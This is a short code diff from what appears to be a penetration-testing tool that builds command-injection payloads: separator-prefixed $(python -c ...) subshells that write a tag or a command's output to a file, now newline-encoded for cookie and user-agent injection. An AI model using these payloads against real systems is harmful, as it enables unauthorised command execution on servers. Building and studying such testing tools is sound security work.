@@ -40,8 +40,9 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
             "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('"+ TAG + "')\nf.close()\n\")"
              ) 
 
-  if settings.COOKIE_INJECTION == True:
-    payload = payload.replace("\n","%0a")
+  if settings.COOKIE_INJECTION or settings.USER_AGENT_INJECTION== True:
+
+    payload = payload.replace("\n","%0d")
 
   return payload
 
@@ -64,6 +65,7 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
   payload = (separator + 
             "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
             )
-  if settings.COOKIE_INJECTION == True:
-    payload = payload.replace("\n","%0a")
+  if settings.COOKIE_INJECTION or settings.USER_AGENT_INJECTION == True:
+    payload = payload.replace("\n","%0d")
+
   return payload
